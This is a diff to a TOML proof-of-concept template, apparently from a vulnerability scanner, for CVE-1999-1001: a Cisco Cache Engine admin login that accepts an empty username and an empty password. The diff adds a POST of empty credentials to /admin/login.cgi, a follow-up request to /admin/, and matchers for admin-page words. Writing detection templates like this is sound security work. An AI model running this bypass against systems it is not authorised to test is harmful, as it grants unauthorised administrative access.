@@ -1,8 +1,8 @@
 [info]
 author = "ave"
-description = "思科缓存引擎管理接口存在认证缺陷，允许远程攻击者使用空用户名和空密码直接登录。本 PoC 通过向管理接口发送不含有效凭据的 HTTP 请求，检测是否可绕过认证获得非授权访问。"
+description = "验证思科缓存引擎是否存在空用户名密码认证绕过漏洞，通过发送空用户名和空密码尝试登录管理接口"
 id = "POC-AVE-1999-0837"
-name = "CVE-1999-1001 Cisco Cache Engine 空凭据认证绕过 PoC"
+name = "CVE-1999-1001 PoC"
 severity = "low"
 tags = ["ave-1999-0837"]
 vuln_id = [
@@ -14,16 +14,59 @@ vuln_id = [
 logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/"
+method = "POST"
+path = "/admin/login.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = ""
-type = "raw"
+content = "username=&password="
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Set-Cookie",
+    "sessionid",
+    "admin",
+    "welcome",
+    "dashboard",
+    "management",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    302,
+    301,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/admin/"
+protocol = "http"
 
 [poc.requests.headers]
 User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "admin",
+    "management",
+    "configuration",
+    "cache engine",
+    "cisco",
+]
 
 [[poc.requests.matchers]]
 expect = true
